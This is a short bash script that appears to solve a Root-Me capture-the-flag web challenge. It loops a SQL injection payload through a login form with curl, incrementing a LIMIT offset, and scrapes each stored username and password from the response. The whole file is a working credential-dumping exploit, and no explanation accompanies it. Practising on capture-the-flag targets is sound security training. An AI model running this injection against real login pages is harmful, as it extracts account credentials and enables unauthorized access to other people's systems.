#!/bin/bash
s='plop'
i=0
# Discover all users in the database with following SQLi on login field: ' OR 1 LIMIT i,i+1 --
# with i incrementing every iteration
while [ -n "$s" ]
do
s=$(curl -s http://challenge01.root-me.org/web-serveur/ch9/ --data "login=%27%20OR%201%20LIMIT%20$i,$((i+1))%20--&password=foo"|grep "Welcome back" |sed -e 's/.*username.*\?value="\([^"]\+\)".*password.*value="\([^"]\+\)".*/\1,\2/')
echo $s
i=$((i+1))
done
